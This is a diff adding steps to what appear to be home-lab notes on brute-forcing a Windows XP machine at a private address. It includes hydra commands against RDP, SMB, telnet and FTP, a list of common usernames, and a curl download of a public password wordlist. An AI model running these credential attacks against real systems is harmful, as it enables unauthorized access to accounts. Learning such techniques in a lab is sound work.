@@ -41,6 +41,12 @@ dirb/common.txt
 metasploit/passwords.txt
 seclists/Passwords/...
 
+5.
+Known username, small password list
+# Basic syntax
+hydra -l administrator -P xp_passwords.txt -t 1 -V 192.168.56.20 rdp
+
+
 # Good realistic XP passwords 2005-2010 era
 curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -o big.txt
 
@@ -49,3 +55,23 @@ curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/
 -t 1     = very important — only 1 thread (RDP on XP locks / slows down with many threads)
 -V       = verbose → shows every try (great for learning)
 rdp://IP = protocol + target
+
+users.txt contents
+administrator
+guest
+user
+owner
+student
+teacher
+
+6.
+SMB file sharing
+# SMB (Windows file share / null session possible on XP)
+hydra -l administrator -P xp_passwords.txt -t 4 -V 192.168.56.20 smb
+# or smb2 on newer hydra versions
+
+hydra -l admin -P rockyou.txt -t 16 -V 192.168.56.20 telnet
+hydra -l ftpuser -P ftp_pass.txt -t 20 ftp://192.168.56.20
+
+7.
+Common Problems
